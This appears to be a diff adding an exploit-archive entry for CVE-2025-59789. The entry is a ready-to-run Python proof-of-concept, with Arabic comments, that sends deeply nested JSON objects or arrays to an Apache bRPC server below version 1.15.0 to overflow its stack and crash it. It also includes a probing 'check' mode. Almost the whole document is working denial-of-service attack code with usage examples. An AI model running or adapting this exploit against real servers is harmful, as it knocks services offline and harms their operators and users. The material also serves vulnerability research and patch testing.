@@ -1,0 +1,185 @@
+=============================================================================================================================================
+| # Title     : Apache bRPC prior to 1.15.0 Stack Overflow via Deep Recursive JSON                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://brpc.apache.org/                                                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212248/ & CVE-2025-59789
+
+[+] Summary : Critical stack overflow vulnerability in Apache bRPC's JSON parser that allows remote attackers to crash servers via specially crafted deep recursive JSON data.
+
+[+]  POC : python poc.py
+
+#!/usr/bin/env python3
+"""
+Proof of Concept (PoC) for CVE-2025-59789
+by indoushka
+"""
+
+import json
+import requests
+import sys
+
+def generate_deep_nested_json(depth=1000):
+    """
+    إنشاء JSON مع بنية متداخلة بعمق كبير
+    """
+    data = {}
+    current = data
+    
+    for i in range(depth):
+        current["nested"] = {}
+        current = current["nested"]
+    
+    current["value"] = "exploit"
+    return json.dumps(data)
+
+def generate_deep_array_json(depth=1000):
+    """
+    إنشاء JSON مع مصفوفة متداخلة بعمق كبير
+    """
+    data = []
+    current = data
+    
+    for i in range(depth):
+        new_array = []
+        current.append(new_array)
+        current = new_array
+    
+    current.append("exploit")
+    return json.dumps(data)
+
+def send_exploit(target_url, depth=10000, exploit_type="object"):
+    """
+    إرسال بيانات JSON متداخلة بعمق لاستغلال الثغرة
+    
+    Args:
+        target_url: عنوان URL للخادم المتأثر
+        depth: عمق التداخل (كلما زاد العمق، زاد احتمال التسبب في stack overflow)
+        exploit_type: نوع البيانات ("object" أو "array")
+    """
+    
+    print(f"[*] إعداد هجوم Stack Overflow على: {target_url}")
+    print(f"[*] نوع الاستغلال: {exploit_type}")
+    print(f"[*] عمق التداخل: {depth}")
+    
+    # إنشاء بيانات JSON متداخلة
+    if exploit_type == "object":
+        print("[*] إنشاء JSON مع كائنات متداخلة...")
+        payload = generate_deep_nested_json(depth)
+    else:
+        print("[*] إنشاء JSON مع مصفوفات متداخلة...")
+        payload = generate_deep_array_json(depth)
+    
+    print(f"[*] حجم الحمولة: {len(payload)} بايت")
+    
+    # إعداد الهيدرات (تعديل حسب واجهة بروتوكول الخادم)
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'CVE-2025-59789-PoC'
+    }
+    
+    try:
+        print("[*] إرسال الطلب...")
+        response = requests.post(
+            target_url,
+            data=payload,
+            headers=headers,
+            timeout=30
+        )
+        
+        print(f"[*] استجابة الخادم: {response.status_code}")
+        
+        # التحقق من تأثير الهجوم
+        if response.status_code >= 500:
+            print("[+] نجاح محتمل! قد يكون الخادم قد تعطل")
+        else:
+            print("[-] الخادم لا يزال يستجيب")
+            
+    except requests.exceptions.ConnectionError:
+        print("[+] نجاح! فقد الاتصال بالخادم - ربما تعطل بسبب stack overflow")
+    except requests.exceptions.ReadTimeout:
+        print("[+] نجاح محتمل! انتهت مهلة الخادم - ربما هو في حالة توقف")
+    except Exception as e:
+        print(f"[!] خطأ: {e}")
+
+def check_vulnerability(target_url):
+    """
+    التحقق من وجود الثغرة بإرسال عمق تداخل متوسط
+    """
+    print("[*] التحقق من وجود الثغرة...")
+    
+    # عمق آمن للاختبار (أقل من 100)
+    safe_depth = 50
+    safe_payload = generate_deep_nested_json(safe_depth)
+    
+    headers = {
+        'Content-Type': 'application/json'
+    }
+    
+    try:
+        response = requests.post(
+            target_url,
+            data=safe_payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            print("[*] الخادم يستجيب للبيانات المتداخلة الآمنة")
+            
+            # محاولة بعمق أكبر (200 - يجب أن يفشل في الإصدار المصحح)
+            dangerous_depth = 200
+            dangerous_payload = generate_deep_nested_json(dangerous_depth)
+            
+            try:
+                response2 = requests.post(
+                    target_url,
+                    data=dangerous_payload,
+                    headers=headers,
+                    timeout=10
+                )
+                
+                if response2.status_code == 200:
+                    print("[-] الخادم يقبل عمق 200 - ربما غير مصحح")
+                else:
+                    print("[+] الخادم يرفض عمق 200 - ربما تم تصحيحه")
+                    
+            except:
+                print("[+] الخادم قد يكون متأثراً")
+                
+    except Exception as e:
+        print(f"[!] خطأ في التحقق: {e}")
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("PoC for CVE-2025-59789 - Apache bRPC Stack Overflow")
+    print("Affected: bRPC < 1.15.0 with json2pb component")
+    print("=" * 60)
+    
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <target_url> [depth] [type]")
+        print(f"Example: {sys.argv[0]} http://localhost:8080/api 10000 object")
+        print(f"Example: {sys.argv[0]} http://localhost:8080/api 5000 array")
+        print(f"Check: {sys.argv[0]} http://localhost:8080/api check")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    
+    if len(sys.argv) > 2 and sys.argv[2] == "check":
+        check_vulnerability(target_url)
+    else:
+        depth = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
+        exploit_type = sys.argv[3] if len(sys.argv) > 3 else "object"
+        
+        if depth > 100000:
+            print("[!] تحذير: عمق كبير جداً قد يتسبب في مشاكل للجهاز المهاجم")
+            confirm = input("[?] هل تريد المتابعة؟ (y/n): ")
+            if confirm.lower() != 'y':
+                sys.exit(0)
+        
+        send_exploit(target_url, depth, exploit_type)
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
